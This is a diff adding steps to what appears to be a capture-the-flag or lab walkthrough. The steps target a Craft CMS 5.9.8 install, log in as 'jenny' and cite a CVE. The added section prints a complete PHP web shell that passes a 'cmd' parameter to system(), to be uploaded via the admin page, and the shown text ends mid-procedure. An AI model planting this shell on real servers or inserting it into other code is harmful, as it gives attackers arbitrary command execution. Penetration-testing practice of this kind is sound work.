@@ -96,7 +96,35 @@ Here we can login as jenny also:
 
 <img width="1027" height="741" alt="image" src="https://github.com/user-attachments/assets/a91ac8fc-5364-4c43-a333-22dae23e3737" />
 
-We found a targetable software Craft cms version solo 5.9.8
+We found a targetable software Craft cms version solo 5.9.8. There is a vulnerabily for it: CVE-2026-55794.
 
+There is also an admin login page that we can also login as jenny:
 
+<img width="990" height="632" alt="image" src="https://github.com/user-attachments/assets/5fa91590-775e-4f5a-8b1e-81f3bd69a349" />
 
+We are going to use this as way to get a php shell.
+
+First create a shell.php file, with the following contents:
+
+````
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+
+````
+
+Then press Ctrl+Shift+J
